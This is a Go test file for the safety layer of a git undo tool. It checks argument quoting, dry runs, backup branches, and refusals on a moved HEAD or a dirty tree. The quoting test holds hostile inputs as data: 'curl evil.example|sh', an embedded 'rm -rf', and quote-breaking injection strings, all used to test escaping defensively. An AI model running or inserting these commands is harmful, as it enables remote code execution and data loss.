package safety

import (
	"context"
	"errors"
	"os"
	"os/exec"
	"path/filepath"
	"reflect"
	"strings"
	"testing"
	"time"

	"github.com/neomikhe/git-rewind/core/gitexec"
)

func TestPreviewQuotesArguments(t *testing.T) {
	plan := Plan{Commands: []Command{
		{Args: []string{"reset", "--hard", "HEAD~1"}},
		{Args: []string{"reset", "--hard", "HEAD@{1}"}},
		{Args: []string{"branch", "feature/login-v2", "e205c733abdb3eac0c074db65389c8717ff69f45"}},
	}}
	want := []string{
		"git reset --hard 'HEAD~1'",
		"git reset --hard 'HEAD@{1}'",
		"git branch feature/login-v2 e205c733abdb3eac0c074db65389c8717ff69f45",
	}
	if got := plan.Preview(); !reflect.DeepEqual(got, want) {
		t.Errorf("Preview() = %q, want %q", got, want)
	}
}

func TestPreviewNeverLetsAShellExpandAnArgument(t *testing.T) {
	cases := map[string]string{
		"two words":                         `'two words'`,
		"WIP on main: 1a2b3c4 fix `rm -rf`": "'WIP on main: 1a2b3c4 fix `rm -rf`'",
		"fix-$(curl evil.example|sh)":       "'fix-$(curl evil.example|sh)'",
		"a;b&c>d":                           "'a;b&c>d'",
		"$HOME":                             "'$HOME'",
		"don't":                             `'don'"'"'t'`,
		"x';calc;#":                         `'x'"'"';calc;#'`,
		"don\u2019t;calc;#":                 "'don'\"\u2019\"'t;calc;#'",
		"\u2018a\u2019\u201ab\u201b":        "''\"\u2018\"'a'\"\u2019\"''\"\u201a\"'b'\"\u201b\"''",
		"HEAD^1":                            "'HEAD^1'",
		"@branch":                           "'@branch'",
		"":                                  "''",
	}
	for arg, want := range cases {
		if got := quoteArg(arg); got != want {
			t.Errorf("quoteArg(%q) = %s, want %s", arg, got, want)
		}
	}
}

func TestWorkingTreeStatus(t *testing.T) {
	dir, _, _ := twoCommitRepo(t)
	git := gitexec.New(dir)
	ctx := context.Background()

	st, err := WorkingTreeStatus(ctx, git)
	if err != nil {
		t.Fatalf("WorkingTreeStatus: %v", err)
	}
	if !st.Clean {
		t.Fatalf("fresh repo reported dirty: %+v", st)
	}

	writeFile(t, dir, "one\ntwo\ndirty\n")
	st, err = WorkingTreeStatus(ctx, git)
	if err != nil {
		t.Fatalf("WorkingTreeStatus: %v", err)
	}
	if st.Clean || len(st.Changes) == 0 {
		t.Fatalf("modified repo reported clean: %+v", st)
	}
}

func TestBackupCreatesBranchAtHead(t *testing.T) {
	dir, _, second := twoCommitRepo(t)
	git := gitexec.New(dir)
	ctx := context.Background()
	now := time.Date(2026, 7, 7, 12, 0, 0, 0, time.UTC)

	name, err := Backup(ctx, git, now, "HEAD")
	if err != nil {
		t.Fatalf("Backup: %v", err)
	}
	if want := "backup/rewind-20260707-120000"; name != want {
		t.Fatalf("backup name = %q, want %q", name, want)
	}
	if tip := revParse(t, git, name); tip != second {
		t.Fatalf("backup points at %s, want HEAD %s", tip, second)
	}
}

func TestApplyDryRunChangesNothing(t *testing.T) {
	dir, _, second := twoCommitRepo(t)
	git := gitexec.New(dir)
	ctx := context.Background()

	plan := Plan{Commands: []Command{{Args: []string{"reset", "--hard", "HEAD~1"}, Explain: "discard the last commit"}}}

	res, err := Apply(ctx, git, plan, Options{})
	if err != nil {
		t.Fatalf("Apply: %v", err)
	}
	if !res.DryRun {
		t.Error("expected a dry run")
	}
	if want := []string{"git reset --hard 'HEAD~1'"}; !reflect.DeepEqual(res.Commands, want) {
		t.Errorf("Commands = %q, want %q", res.Commands, want)
	}
	if head := revParse(t, git, "HEAD"); head != second {
		t.Errorf("dry run moved HEAD to %s, want %s", head, second)
	}
	branches, err := git.Run(ctx, "branch", "--list", backupPrefix+"*")
	if err != nil {
		t.Fatalf("listing backup branches: %v", err)
	}
	if strings.TrimSpace(branches) != "" {
		t.Errorf("dry run created a backup branch: %q", branches)
	}
}

func TestApplyExecutesAfterBackup(t *testing.T) {
	dir, first, second := twoCommitRepo(t)
	git := gitexec.New(dir)
	ctx := context.Background()
	now := time.Date(2026, 7, 7, 9, 30, 0, 0, time.UTC)

	plan := Plan{Commands: []Command{{Args: []string{"reset", "--hard", "HEAD~1"}, Explain: "discard the last commit"}}}

	res, err := Apply(ctx, git, plan, Options{Execute: true, Expected: headOf(t, git), Now: now})
	if err != nil {
		t.Fatalf("Apply: %v", err)
	}
	if res.DryRun {
		t.Error("expected a real run")
	}
	if want := "backup/rewind-20260707-093000"; res.BackupBranch != want {
		t.Fatalf("BackupBranch = %q, want %q", res.BackupBranch, want)
	}
	if tip := revParse(t, git, res.BackupBranch); tip != second {
		t.Errorf("backup points at %s, want pre-reset HEAD %s", tip, second)
	}
	if head := revParse(t, git, "HEAD"); head != first {
		t.Errorf("HEAD is %s after reset, want %s", head, first)
	}
}

func TestApplyReportsTheBackupWhenAPlanFailsPartway(t *testing.T) {
	dir, _, _ := twoCommitRepo(t)
	git := gitexec.New(dir)

	plan := Plan{
		Commands: []Command{
			{Args: []string{"branch", "applied-before-the-failure"}, Explain: "succeeds"},
			{Args: []string{"branch", "--no-such-flag"}, Explain: "fails"},
		},
		Warnings: []string{"test plan"},
	}

	now := time.Date(2026, 7, 7, 14, 15, 0, 0, time.UTC)
	res, err := Apply(context.Background(), git, plan, Options{Execute: true, Expected: headOf(t, git), Now: now})
	if err == nil {
		t.Fatal("expected the second command to fail")
	}

	var applyErr *ApplyError
	if !errors.As(err, &applyErr) {
		t.Fatalf("error is %T, want *ApplyError so callers can name the backup branch", err)
	}
	if applyErr.BackupBranch == "" || applyErr.BackupBranch != res.BackupBranch {
		t.Errorf("ApplyError.BackupBranch = %q, Result.BackupBranch = %q; both must name the backup",
			applyErr.BackupBranch, res.BackupBranch)
	}
	if !strings.Contains(applyErr.Error(), applyErr.BackupBranch) {
		t.Errorf("the error text does not mention the backup branch: %q", applyErr.Error())
	}
	if !strings.Contains(applyErr.Command, "--no-such-flag") {
		t.Errorf("ApplyError.Command = %q, want the command that failed", applyErr.Command)
	}
	if revParse(t, git, applyErr.BackupBranch) == "" {
		t.Error("the backup branch named in the error does not resolve")
	}
}

func twoCommitRepo(t *testing.T) (dir, first, second string) {
	t.Helper()
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not found in PATH")
	}

	dir = t.TempDir()
	run := func(args ...string) string {
		cmd := exec.Command("git", args...) //nolint:gosec // G204: fixed "git" command with test-controlled arguments.
		cmd.Dir = dir
		cmd.Env = append(os.Environ(),
			"GIT_CONFIG_GLOBAL="+os.DevNull,
			"GIT_CONFIG_SYSTEM="+os.DevNull,
			"GIT_AUTHOR_NAME=Test",
			"GIT_AUTHOR_EMAIL=test@example.invalid",
			"GIT_COMMITTER_NAME=Test",
			"GIT_COMMITTER_EMAIL=test@example.invalid",
			"GIT_AUTHOR_DATE=2026-01-01T00:00:00Z",
			"GIT_COMMITTER_DATE=2026-01-01T00:00:00Z",
		)
		out, err := cmd.CombinedOutput()
		if err != nil {
			t.Fatalf("git %v: %v\n%s", args, err, out)
		}
		return strings.TrimSpace(string(out))
	}

	run("init", "-q", "-b", "main")
	run("config", "commit.gpgsign", "false")
	writeFile(t, dir, "one\n")
	run("add", "f.txt")
	run("commit", "-q", "-m", "first commit")
	first = run("rev-parse", "HEAD")
	writeFile(t, dir, "one\ntwo\n")
	run("commit", "-q", "-am", "second commit")
	second = run("rev-parse", "HEAD")
	return dir, first, second
}

func writeFile(t *testing.T, dir, content string) {
	t.Helper()
	if err := os.WriteFile(filepath.Join(dir, "f.txt"), []byte(content), 0o600); err != nil {
		t.Fatal(err)
	}
}

func revParse(t *testing.T, git *gitexec.Runner, ref string) string {
	t.Helper()
	out, err := git.Run(context.Background(), "rev-parse", ref)
	if err != nil {
		t.Fatalf("rev-parse %s: %v", ref, err)
	}
	return strings.TrimSpace(out)
}

func TestApplyRefusesWhenHeadMovedAfterDetection(t *testing.T) {
	dir, _, _ := twoCommitRepo(t)
	git := gitexec.New(dir)
	ctx := context.Background()
	detectedAgainst := headOf(t, git)
	if _, err := git.Mutate(ctx, "checkout", "-q", "-b", "elsewhere"); err != nil {
		t.Fatal(err)
	}

	plan := Plan{Commands: []Command{{Args: []string{"reset", "--soft", "HEAD~1"}, Explain: "undo"}}}
	_, err := Apply(ctx, git, plan, Options{Execute: true, Expected: detectedAgainst, Now: time.Now()})
	if !errors.Is(err, ErrHeadMoved) {
		t.Fatalf("Apply after a branch switch = %v, want ErrHeadMoved", err)
	}
	assertNoBackup(t, git)
}

func TestApplyRefusesWithoutTheHeadThePlanWasDetectedAgainst(t *testing.T) {
	dir, _, _ := twoCommitRepo(t)
	git := gitexec.New(dir)

	plan := Plan{Commands: []Command{{Args: []string{"reset", "--soft", "HEAD~1"}, Explain: "undo"}}}
	_, err := Apply(context.Background(), git, plan, Options{Execute: true, Now: time.Now()})
	if !errors.Is(err, ErrHeadMoved) {
		t.Fatalf("Apply with no expected HEAD = %v, want ErrHeadMoved", err)
	}
	assertNoBackup(t, git)
}

func TestApplyRefusesToDiscardATreeThatBecameDirty(t *testing.T) {
	dir, first, second := twoCommitRepo(t)
	git := gitexec.New(dir)
	ctx := context.Background()
	detectedAgainst := headOf(t, git)
	writeFile(t, dir, "one\ntwo\nedited after the rescue was shown\n")

	plan := Plan{
		Commands:        []Command{{Args: []string{"reset", "--hard", "HEAD~1"}, Explain: "discard"}},
		DiscardsChanges: true,
	}
	_, err := Apply(ctx, git, plan, Options{Execute: true, Expected: detectedAgainst, Now: time.Now()})
	if !errors.Is(err, ErrDirtyTree) {
		t.Fatalf("Apply on a dirty tree = %v, want ErrDirtyTree", err)
	}
	assertNoBackup(t, git)
	if head := revParse(t, git, "HEAD"); head != second {
		t.Fatalf("a refused plan moved HEAD to %s", head)
	}

	res, err := Apply(ctx, git, plan, Options{Execute: true, AllowDiscard: true, Expected: detectedAgainst, Now: time.Now()})
	if err != nil {
		t.Fatalf("Apply with AllowDiscard: %v", err)
	}
	if res.BackupBranch == "" || revParse(t, git, "HEAD") != first {
		t.Errorf("forced Apply = %+v, want a backup and HEAD at %s", res, first)
	}
}

func TestApplyKeepsADirtyTreeForAPlanThatPreservesIt(t *testing.T) {
	dir, first, _ := twoCommitRepo(t)
	git := gitexec.New(dir)
	detectedAgainst := headOf(t, git)
	writeFile(t, dir, "one\ntwo\nuncommitted\n")

	plan := Plan{Commands: []Command{{Args: []string{"reset", "--soft", "HEAD~1"}, Explain: "undo, keep changes"}}}
	if _, err := Apply(context.Background(), git, plan, Options{Execute: true, Expected: detectedAgainst, Now: time.Now()}); err != nil {
		t.Fatalf("Apply refused a plan that keeps the working tree: %v", err)
	}
	if head := revParse(t, git, "HEAD"); head != first {
		t.Errorf("HEAD = %s, want %s", head, first)
	}
}

func headOf(t *testing.T, git *gitexec.Runner) gitexec.Head {
	t.Helper()
	head, err := git.HeadState(context.Background())
	if err != nil {
		t.Fatalf("HeadState: %v", err)
	}
	return head
}

func assertNoBackup(t *testing.T, git *gitexec.Runner) {
	t.Helper()
	branches, err := git.Run(context.Background(), "branch", "--list", backupPrefix+"*")
	if err != nil {
		t.Fatalf("listing backup branches: %v", err)
	}
	if strings.TrimSpace(branches) != "" {
		t.Errorf("a refused plan still created a backup branch: %q", branches)
	}
}

func TestWorkingTreeStatusSeesUntrackedFilesWhateverTheConfig(t *testing.T) {
	dir, _, _ := twoCommitRepo(t)
	git := gitexec.New(dir)
	ctx := context.Background()
	if _, err := git.Mutate(ctx, "config", "status.showUntrackedFiles", "no"); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "untracked.txt"), []byte("not committed\n"), 0o600); err != nil {
		t.Fatal(err)
	}

	st, err := WorkingTreeStatus(ctx, git)
	if err != nil {
		t.Fatalf("WorkingTreeStatus: %v", err)
	}
	if st.Clean {
		t.Error("an untracked file went unseen because of status.showUntrackedFiles=no")
	}
}
